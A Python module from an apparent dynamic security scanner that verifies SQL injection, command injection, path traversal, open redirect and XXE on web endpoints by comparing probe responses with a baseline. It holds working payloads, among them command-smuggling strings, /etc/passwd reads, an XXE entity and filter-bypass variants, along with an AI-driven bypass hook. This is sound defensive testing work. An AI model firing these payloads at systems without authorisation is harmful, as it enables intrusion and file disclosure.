"""
Differential Baseline vs Diagnostic & Agentic Filter-Bypass HTTP Verifier (Stage 2 & 4 DAST).
Probes SQLi (CWE-89), CmdInj (CWE-78), Path Traversal (CWE-22), Open Redirect (CWE-601) and XXE (CWE-611).
"""
from __future__ import annotations

import asyncio
import re
import urllib.parse
from typing import Any, Dict, List, Optional, Tuple
import httpx

from vajra.correlation.ai_triage import synthesize_filter_bypass_payload
from vajra.dast.crawler import DastTargetEndpoint
from vajra.dast.inputs import GENERIC_PARAMS_BY_CWE, derive_inputs
from vajra.dast.safety import assert_safe_target
from vajra.models import CommonFinding
import logging
_log = logging.getLogger("vajra.dast")

DIAGNOSTIC_PROBES: Dict[str, List[Dict[str, Any]]] = {
    "CWE-89": [
        {
            "type": "sqli_quote",
            "payload": "1'",
            "expected_error": r"(syntax error|sqliteexception|bad sql grammar|org\.h2\.jdbc|sql syntax|sql statement)",
        },
        {
            "type": "sqli_agentic_comment_bypass",
            "payload": "1'/**/OR/**/('1'='1",
            "expected_error": r"(syntax error|org\.h2\.jdbc|sql statement)",
        },
        {
            "type": "sqli_boolean_true",
            "payload": "1' OR '1'='1",
            "expected_status": 200,
        },
        {
            "type": "sqli_union",
            "payload": "1' UNION SELECT 1, 'VAJRA_SQLI_PROOF', '3', '4' --",
            "expected_marker": "VAJRA_SQLI_PROOF",
        },
    ],
    "CWE-78": [
        {
            "type": "cmd_sh",
            "payload": "127.0.0.1; echo VAJRA_CMD_PROOF",
            "expected_marker": "VAJRA_CMD_PROOF",
        },
        {
            "type": "cmd_ampersand",  # also works where the shell is cmd.exe (Windows hosts)
            "payload": "127.0.0.1 & echo VAJRA_CMD_PROOF",
            "expected_marker": "VAJRA_CMD_PROOF",
        },
        {
            "type": "cmd_agentic_ifs",
            "payload": "127.0.0.1|echo${IFS}VAJRA_CMD_PROOF",
            "expected_marker": "VAJRA_CMD_PROOF",
        },
    ],
    "CWE-22": [
        {
            "type": "trav_etc",
            "payload": "../../../../etc/passwd",
            "expected_marker": "root:x:0:0",
        },
        {
            "type": "trav_windows",  # Windows host: C:\Windows\win.ini
            "payload": "../../../../../../../../../../windows/win.ini",
            "expected_marker": "for 16-bit app support",
        },
        {
            "type": "trav_absolute",  # os.path.join(base, "/etc/passwd") discards base (Python / Node path.join-like APIs)
            "payload": "/etc/passwd",
            "expected_marker": "root:x:0:0",
        },
        {
            "type": "trav_absolute_windows",
            "payload": "C:/Windows/win.ini",
            "expected_marker": "for 16-bit app support",
        },
        {
            "type": "trav_agentic_nested",
            "payload": "....//....//....//etc/passwd",
            "expected_marker": "root:x:0:0",
        },
    ],
    "CWE-601": [
        {
            "type": "open_redirect",
            "payload": "https://example.com/vajra_redirect",
            "expected_redirect": "example.com/vajra_redirect",
        },
        {
            "type": "open_redirect_schema_less",
            "payload": "//example.com/vajra_redirect",
            "expected_redirect": "example.com/vajra_redirect",
        },
    ],
    "CWE-611": [
        {
            "type": "xxe_external_entity",
            "payload": '<?xml version="1.0"?><!DOCTYPE book [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><book><name>&xxe;</name><author>probe</author></book>',
            "expected_marker": "root:x:0:0",
            "raw_xml": True,
        },
    ],
}

# NOTE: SSRF (CWE-918) and IDOR (CWE-639) have no probe here. Their old markers only ever existed in the retired
# emulator (scripts/legacy_emulator), so they could never confirm on a real app; those classes stay Code-only.

GENERIC_PROBE_ORDER: List[str] = ["CWE-89", "CWE-78", "CWE-22", "CWE-601", "CWE-611"]

VULN_TITLE_BY_CWE: Dict[str, str] = {
    "CWE-89": "Confirmed SQL Injection",
    "CWE-78": "Confirmed OS Command Injection",
    "CWE-22": "Confirmed Path Traversal",
    "CWE-601": "Confirmed Open Redirect",
    "CWE-918": "Confirmed Server-Side Request Forgery (SSRF)",
    "CWE-611": "Confirmed XML External Entity (XXE) Injection",
    "CWE-639": "Confirmed Insecure Direct Object Reference (IDOR)",
}


def _resolve_target_cwe(vuln_hint: str, url: str) -> Optional[str]:
    """WEAK extra hint only: a guess from route/URL words. SAST cwe_hints and the generic probe order are the
    primary drivers; this merely lets an obviously named route try its likely class first."""
    combined = f"{vuln_hint} {url}".upper()
    if "XSS" in combined or "CACHE_POISONING" in combined or "CACHEPOISONING" in combined:
        return None  # Handled by Stage 3 Playwright DOM verifier
    if "SQL" in combined:
        return "CWE-89"
    if "COMMAND" in combined:
        return "CWE-78"
    if "TRAVERSAL" in combined:
        return "CWE-22"
    if "REDIRECT" in combined or "3XX" in combined:
        return "CWE-601"
    if "XXE" in combined:
        return "CWE-611"
    return None


async def verify_endpoint_vulnerabilities(
    endpoint: DastTargetEndpoint,
    client: httpx.AsyncClient,
) -> List[CommonFinding]:
    """Probe an endpoint for the vulnerability classes it is expected to carry.

    SAST-guided endpoints carry CWE hints derived from the SAST sinks reachable from the route; those drive the
    probe selection. Independent endpoints fall back to the weaker route-name / annotation heuristic.
    """
    assert_safe_target(endpoint.url)
    await derive_inputs(endpoint, client)
    has_inputs = bool(endpoint.params or endpoint.path_vars)
    targets: List[str] = [c for c in endpoint.cwe_hints if c in DIAGNOSTIC_PROBES]
    guess = _resolve_target_cwe(endpoint.vulnerability_hint or "", endpoint.url)
    if guess in DIAGNOSTIC_PROBES and guess not in targets:
        targets.append(guess)
    if not endpoint.cwe_hints and has_inputs:
        # Nothing from SAST tells us what this route is for (an unseen app's /api/orders looks like this):
        # try every core injection class on its derived inputs. The confirmation rules are strict
        # (echo-proof markers, true/false SQL pairs). XSS goes through the browser stage in runner.py.
        for c in GENERIC_PROBE_ORDER:
            if c not in targets:
                targets.append(c)
    results: List[CommonFinding] = []
    for cwe_target in targets:
        # Every class is tried (one confirmation per class): an endpoint can carry two different bugs, and
        # stopping at the first hit would make the result depend on probe order.
        results.extend(await _verify_for_cwe(endpoint, client, cwe_target))
    return results


def _evaluate_confirmation(
    probe_specs: List[Dict[str, Any]],
    p_status: int,
    p_body: str,
    p_headers: httpx.Headers,
    base_body: str,
    payload: Optional[str] = None,
) -> Tuple[bool, str]:
    """Check a live HTTP response against every detection rule known for this CWE class (grammar-fault
    regex, success marker, or redirect target). The rules are a property of the vulnerability class, not
    of which specific payload was sent - the same check applies whether the payload came from the static
    library or from an AI-crafted bypass.
    """
    for spec in probe_specs:
        if "expected_error" in spec:
            m = re.search(spec["expected_error"], p_body, re.IGNORECASE)
            if m and not re.search(spec["expected_error"], base_body, re.IGNORECASE):
                return True, f"Differential HTTP {p_status} database grammar fault triggered: '{m.group(0)}'"
        if "expected_marker" in spec:
            marker = spec["expected_marker"]
            # The marker is part of the payload, so an app that merely echoes input would contain it too:
            # only count it if it is still there after removing every echoed copy of the payload.
            body_wo_echo = _strip_echo(p_body, payload) if payload else p_body
            if marker.startswith("VAJRA_"):
                # A page that reflects the payload with some characters rewritten (e.g. `&` -> entity) still
                # shows the command text "echo <marker>". Real execution prints the marker WITHOUT that text.
                body_wo_echo = re.sub(r"echo.{0,24}?" + re.escape(marker), "", body_wo_echo, flags=re.IGNORECASE | re.DOTALL)
            if marker in body_wo_echo and marker not in base_body:
                return True, f"Differential HTTP {p_status} proof marker '{marker}' reflected (baseline absent)"
        if "expected_redirect" in spec:
            loc = (p_headers.get("location", "") if p_headers is not None else "").strip()
            host = spec["expected_redirect"].split("/", 1)[0]
            # The browser must actually leave the site: the Location's own host is the attacker's, not a local
            # URL that merely carries the attacker URL in its query string.
            loc_host = urllib.parse.urlparse(loc if "//" in loc[:8] or loc.startswith("//") else "http://_local_" + loc).netloc
            loc_host = loc_host.split("@")[-1].split(":")[0].lower()
            if p_status in (301, 302, 303, 307, 308) and (loc_host == host or loc_host.endswith("." + host)):
                return True, f"HTTP {p_status} external redirection confirmed via Location header: {loc}"
    return False, ""


async def _send_probe(
    endpoint: DastTargetEndpoint,
    client: httpx.AsyncClient,
    target_url: str,
    param_name: str,
    payload: str,
    is_raw_xml: bool,
) -> Tuple[Optional[int], str, Optional[httpx.Headers]]:
    req_params = req_data = req_content = None
    req_headers: Dict[str, str] = {}
    send_url = target_url
    method = endpoint.method
    if param_name.startswith("path:"):
        # Path variable: substitute the payload into the URL path itself, other variables get a neutral value.
        var = param_name[5:]
        tmpl = getattr(endpoint, "url_template", None) or target_url
        def _sub(m: "re.Match") -> str:
            name = next((g for g in m.groups() if g), "")
            return urllib.parse.quote(payload, safe="") if name == var else "1"
        send_url = re.sub(r"\{\s*([A-Za-z_]\w*)\s*(?::[^}]*)?\}|<(?:[A-Za-z_]\w*:)?([A-Za-z_]\w*)>|(?<=/):([A-Za-z_]\w*)", _sub, tmpl)
        is_raw_xml = False
    elif is_raw_xml:
        req_content = payload.encode("utf-8")
        req_headers["Content-Type"] = "application/xml"
    else:
        fields = dict(getattr(endpoint, "form_defaults", {}) or {})
        fields[param_name] = payload
        if method == "GET":
            req_params = fields
        else:
            req_data = fields
    as_json = req_data is not None and getattr(endpoint, "body_format", "form") == "json"
    last_exc: Optional[BaseException] = None
    # Transient transport failures (dropped keep-alive connection, reset, timeout under load) are retried with
    # the SAME request. Before, any non-timeout error silently skipped the probe, which made results flaky.
    for attempt, timeout in enumerate((3.5, 10.0, 10.0)):
        try:
            resp = await client.request(
                "POST" if is_raw_xml else method, send_url,
                params=req_params, data=None if as_json else req_data, json=req_data if as_json else None,
                content=req_content, headers=req_headers or None,
                timeout=timeout, follow_redirects=False,
            )
            if resp.status_code == 415 and req_data is not None and not as_json:
                # The route wants a JSON body, not a form: same field, JSON encoding.
                resp = await client.request(method, send_url, json=req_data, timeout=timeout, follow_redirects=False)
            return resp.status_code, resp.text, resp.headers
        except httpx.TransportError as exc:
            last_exc = exc
            await asyncio.sleep(0.2 * (attempt + 1))
        except Exception as exc:  # malformed URL etc. - retrying will not help
            last_exc = exc
            break
    _log.warning("probe not delivered after retries: %s %s (%s)", method, send_url, type(last_exc).__name__)
    return None, "", None


async def _verify_for_cwe(
    endpoint: DastTargetEndpoint,
    client: httpx.AsyncClient,
    cwe_target: str,
) -> List[CommonFinding]:
    """Differential baseline vs diagnostic probe verification for one CWE class.

    Order of attempts, per parameter:
      1. If SAST found a real guard/filter guarding this exact sink (`endpoint.guard_context`), ask the
         AI filter-bypass engine to craft a payload grounded in THAT guard's actual source text, and try
         it first (genuinely AI-driven, varies per Java file - see ai_triage.synthesize_filter_bypass_payload).
      2. The static known-payload library (DIAGNOSTIC_PROBES) as a deterministic fallback/baseline - this
         is an ordinary payload library, not AI, and is never reported as agentic.
    """
    findings: List[CommonFinding] = []
    target_url = endpoint.url

    probes = DIAGNOSTIC_PROBES.get(cwe_target, [])
    if not probes:
        return findings

    params_to_probe = [f"path:{v}" for v in endpoint.path_vars] + list(endpoint.params)
    if not params_to_probe:
        # SAST says this route reaches a sink of this class but nothing else told us its input names:
        # conventional names for the class, framework-neutral.
        params_to_probe = list(GENERIC_PARAMS_BY_CWE.get(cwe_target, ["id"]))
    raw_cwe = "CWE-77" if cwe_target == "CWE-78" else cwe_target
    is_xml_cwe = cwe_target == "CWE-611"

    base_body = None
    for _attempt in range(2):
        try:
            base_resp = await client.request(endpoint.method, target_url, timeout=6.0, follow_redirects=False)
            base_body = base_resp.text
            break
        except Exception:
            continue
    if base_body is None:
        return findings

    # Ground an AI bypass attempt in the REAL guard code SAST found for this sink, if any.
    guard_hit = next(
        (g for g in endpoint.guard_context if g["cwe"] == cwe_target and (g.get("guard_snippet") or g.get("handler_source"))),
        None,
    )
    ai_result: Optional[Dict[str, Any]] = None
    if guard_hit:
        try:
            loop = asyncio.get_event_loop()
            ai_result = await loop.run_in_executor(
                None,
                lambda: synthesize_filter_bypass_payload(
                    cwe=cwe_target,
                    vuln_type=VULN_TITLE_BY_CWE.get(cwe_target, cwe_target),
                    base_payload=probes[0]["payload"],
                    guard_snippet=guard_hit.get("guard_snippet", ""),
                    code_snippet=guard_hit.get("code_snippet", ""),
                    file_path=guard_hit.get("file"),
                    function_name=guard_hit.get("function_name"),
                    handler_source=guard_hit.get("handler_source", ""),
                    handler_label=guard_hit.get("handler_label"),
                ),
            )
        except Exception:
            ai_result = None

    for param_name in params_to_probe:
        candidates: List[Tuple[str, str, Optional[Dict[str, Any]]]] = []
        if ai_result:
            candidates.append(("ai_agentic", ai_result["payload"], ai_result))
        for probe in probes:
            candidates.append((probe["type"], probe["payload"], None))

        for probe_type, payload, ai_meta in candidates:
            p_status, p_body, p_headers = await _send_probe(
                endpoint, client, target_url, param_name, payload, is_xml_cwe
            )
            if p_status is None:
                continue

            confirmed, proof_msg = _evaluate_confirmation(probes, p_status, p_body, p_headers, base_body, payload)

            if confirmed and "proof marker" in proof_msg:
                # Control: re-request with a harmless value. If the marker is STILL there, the page is showing
                # stored / previously submitted text (e.g. a comment wall), not executing this payload.
                c_status, c_body, _ = await _send_probe(endpoint, client, target_url, param_name, "vajractl", is_xml_cwe)
                if c_status is not None and any(
                    sp.get("expected_marker") and sp["expected_marker"] in (c_body or "") for sp in probes
                ):
                    confirmed = False

            if not confirmed:
                continue

            is_ai = probe_type == "ai_agentic" and ai_meta is not None
            finding = CommonFinding(
                finding_id=f"DAST-CONFIRMED-{cwe_target}-{target_url}-{param_name.replace('path:', '', 1)}",
                stage="DAST",
                scanner="Vajra-AI-Agentic-Evasion" if is_ai else "Vajra-Differential-Verifier",
                cwe=cwe_target,
                raw_cwe=raw_cwe,
                vuln_type=VULN_TITLE_BY_CWE.get(cwe_target, f"Confirmed {cwe_target} Vulnerability"),
                severity="CRITICAL" if cwe_target in ("CWE-89", "CWE-78") else ("MEDIUM" if cwe_target == "CWE-601" else "HIGH"),
                url=target_url,
                method="POST" if is_xml_cwe else endpoint.method,
                parameter=param_name.replace("path:", "", 1),
                payload=payload,
                evidence=proof_msg,
                is_agentic_ai=is_ai,
                discovery=endpoint.discovery,
                evidence_origin="live-http",
            )
            if is_ai:
                finding.ai_technique = ai_meta.get("technique")
                finding.ai_chain_of_thought = ai_meta.get("chain_of_thought", [])
                finding.ai_engine = ai_meta.get("engine")
                finding.ai_guard_basis = ai_meta.get("guard_basis")
            findings.append(finding)
            break

        if not findings and cwe_target == "CWE-89":
            proof = await _boolean_sqli_proof(endpoint, client, target_url, param_name)
            if proof:
                payload, proof_msg = proof
                findings.append(CommonFinding(
                    finding_id=f"DAST-CONFIRMED-{cwe_target}-{target_url}-{param_name.replace('path:', '', 1)}",
                    stage="DAST",
                    scanner="Vajra-Differential-Verifier",
                    cwe=cwe_target,
                    raw_cwe=raw_cwe,
                    vuln_type=VULN_TITLE_BY_CWE.get(cwe_target, "SQL Injection"),
                    severity="CRITICAL",
                    url=target_url,
                    method=endpoint.method,
                    parameter=param_name.replace("path:", "", 1),
                    payload=payload,
                    evidence=proof_msg,
                    discovery=endpoint.discovery,
                    evidence_origin="live-http",
                ))

        if findings:
            break

    return findings


def _strip_echo(body: str, payload: str) -> str:
    """Remove every echoed copy of the payload (raw, URL-encoded, HTML-escaped) so an app that merely repeats
    the input back - including a SAFE page that HTML-escapes it - never looks like it executed it."""
    import html as _html
    import urllib.parse as _up
    if len(payload or "") < 4:
        return body  # a short value like "1" also occurs naturally in the page; stripping it would corrupt it
    forms = {payload, _up.quote(payload), _up.quote_plus(payload), _html.escape(payload), _html.escape(payload, quote=False),
             payload.replace("'", "&#39;"), payload.replace("'", "&#x27;"), _html.escape(payload).replace("&#x27;", "&#39;")}
    for form in sorted(forms, key=len, reverse=True):
        if form:
            body = body.replace(form, "")
    return body


def _same_page(a: str, b: str) -> bool:
    """Short responses (API / blind-SQLi style 'found' vs 'not found') must match exactly; long HTML pages
    may differ slightly (timestamps, tokens), so they are compared by text similarity."""
    a, b = a.strip(), b.strip()
    if a == b:
        return True
    if max(len(a), len(b)) < 300:
        return False
    import difflib
    return difflib.SequenceMatcher(None, a[:20000], b[:20000], autojunk=False).ratio() >= 0.98


async def _boolean_sqli_proof(endpoint, client, target_url: str, param_name: str) -> Optional[Tuple[str, str]]:
    """SQL injection proven by behaviour alone (no error text needed). Three independent tests, each built so a
    parameterised (safe) query - which treats the whole input as one literal - can never pass:

      1. AND-pair on an existing value: base "1"; "1' AND '1'='1" must give the SAME page, "...'1'='2" a DIFFERENT one.
      2. OR-pair on a missing value: base "zzvq"; "zzvq' OR '1'='1" must give a DIFFERENT page (more rows), while
         "zzvq' OR '1'='2" gives the SAME page as base. (Covers search boxes where "1" matches nothing.)
      3. Quote toggle: base 2xx, "zzvq'" -> 5xx, "zzvq''" (SQL-escaped quote) -> same as base.
    Every comparison strips echoed copies of the payload first."""
    async def get(v: str):
        st, body, _ = await _send_probe(endpoint, client, target_url, param_name, v, False)
        return st, _strip_echo(body or "", v)

    b_status, b_body = await get("1")
    if b_status is not None and b_status < 500 and b_body:
        for t_pl, f_pl in (("1' AND '1'='1", "1' AND '1'='2"), ("1 AND 1=1", "1 AND 1=2")):
            (ts, tb), (fs, fb) = await get(t_pl), await get(f_pl)
            if ts is None or fs is None:
                continue
            if ts == b_status and _same_page(tb, b_body) and not _same_page(fb, b_body) and not _same_page(tb, fb):
                return t_pl, (f"Boolean differential SQLi confirmed: baseline '1' -> {len(b_body)}B, TRUE [{t_pl}] -> same page, "
                              f"FALSE [{f_pl}] -> different page ({len(fb)}B)")

    m_status, m_body = await get("zzvq")
    if m_status is not None and m_status < 500:
        for t_pl, f_pl in (("zzvq' OR '1'='1", "zzvq' OR '1'='2"), ("0 OR 1=1", "0 OR 1=2")):
            (ts, tb), (fs, fb) = await get(t_pl), await get(f_pl)
            if ts is None or fs is None or ts >= 500:
                continue
            if fs == m_status and _same_page(fb, m_body) and not _same_page(tb, m_body) and not _same_page(tb, fb):
                return t_pl, (f"Boolean differential SQLi confirmed: no-match value 'zzvq' -> {len(m_body)}B, "
                              f"always-TRUE [{t_pl}] -> different page ({len(tb)}B, extra rows), always-FALSE [{f_pl}] -> same page")
        (q1s, _), (q2s, q2b) = await get("zzvq'"), await get("zzvq''")
        if q1s is not None and q2s is not None and q1s >= 500 and q2s == m_status and _same_page(q2b, m_body):
            return "zzvq'", (f"SQL quote-toggle confirmed: 'zzvq' -> HTTP {m_status}, unbalanced quote 'zzvq'' -> HTTP {q1s} "
                             f"(server error), SQL-escaped 'zzvq''' -> HTTP {q2s} again: the quote reaches SQL syntax")
    return None
